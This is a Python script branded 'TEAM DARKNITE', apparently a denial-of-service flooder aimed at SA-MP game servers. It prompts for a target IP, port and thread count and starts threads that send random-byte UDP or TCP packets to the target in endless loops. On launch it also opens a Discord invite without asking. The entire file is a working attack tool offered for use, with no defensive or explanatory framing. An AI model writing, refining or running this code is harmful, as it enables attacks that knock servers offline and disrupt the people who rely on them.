# AUTHOR SAMP NUDOS
import random
import socket
import threading
import os
import time

# ===== BRAND NAME =====
BRAND = "TEAM DARKNITE"
PRINT_TAG = f"[{BRAND}]"

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[35m Welcome to TEAM DARKNITE Tool ")

# user inputs
ip = str(input(" IP Target : "))
port = int(input(" Port Target : "))
choice = str(input(" UDP(y/n)? : ")).lower()
times = int(input(" Packets per thread : "))
threads = int(input(" Threads : "))

# ===== WORKER FUNCTIONS =====
def run():
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(times):
                s.sendto(data, (ip, port))
            print(f"{i} {PRINT_TAG} Attack Sent!!!")
            s.close()
            time.sleep(0.01)  # تخفيف الضغط
        except Exception as e:
            print(f"{PRINT_TAG} Error!!! {e}")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(f"{i} {PRINT_TAG} Attack Sent!!!")
            s.close()
            time.sleep(0.01)
        except Exception as e:
            print(f"{PRINT_TAG} Error!!! {e}")

def run3():
    data = random._urandom(1025)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
            print(f"{i} {PRINT_TAG} Attack Sent!!!")
            s.close()
            time.sleep(0.01)
        except Exception as e:
            print(f"{PRINT_TAG} Error!!! {e}")

def run4():
    data = random._urandom(777)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(f"{i} {PRINT_TAG} Attack Sent!!!")
            s.close()
            time.sleep(0.01)
        except Exception as e:
            print(f"{PRINT_TAG} Error!!! {e}")

# ===== THREAD SPAWNER =====
for y in range(threads):
    if choice == 'y':
        t = threading.Thread(target=random.choice([run, run3]))
        t.start()
    else:
        t = threading.Thread(target=random.choice([run2, run4]))
        t.start()
